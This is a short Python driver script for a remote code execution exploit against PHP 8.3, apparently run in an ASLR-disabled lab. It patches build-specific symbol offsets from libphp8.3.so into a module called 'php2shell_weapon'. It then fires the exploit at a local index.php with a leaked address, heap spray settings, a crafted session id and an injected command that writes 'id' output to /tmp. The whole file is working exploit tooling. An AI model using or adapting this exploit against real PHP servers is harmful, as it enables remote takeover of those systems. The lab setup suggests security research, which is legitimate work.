#!/usr/bin/env python3
"""RCE driver: php2shell_weapon with THIS build's real symbol offsets.
zval_ptr_dtor  = libphp8.3.so + 0x306380
zend_call_function = libphp8.3.so + 0x2f9010
CALL_DELTA = 0x306380 - 0x2f9010 = 0xD370   (video intel 0xBE3F0 is their build)
Run under the ASLR-off lab (/tmp/php2shell_ap/rce_lab.sh).
"""
import os
import sys
sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
import php2shell_weapon as W

W.CALL_DELTA = 0xD370

sys.argv = ["php2shell_weapon.py",
            "http://127.0.0.1:18120/index.php",
            "--profile", "low", "--lab",
            "--leak", "0x7ffff6906380",
            "--command", "id > /tmp/php2shell_rce_proof.txt",
            "--fire-sid", "uu123456789abcdefghijklmnopqrstu",
            "--arm-namelen", "98304",
            "--spray", "200",
            "--rearm",
            "--attempts", "8"]
W.main()
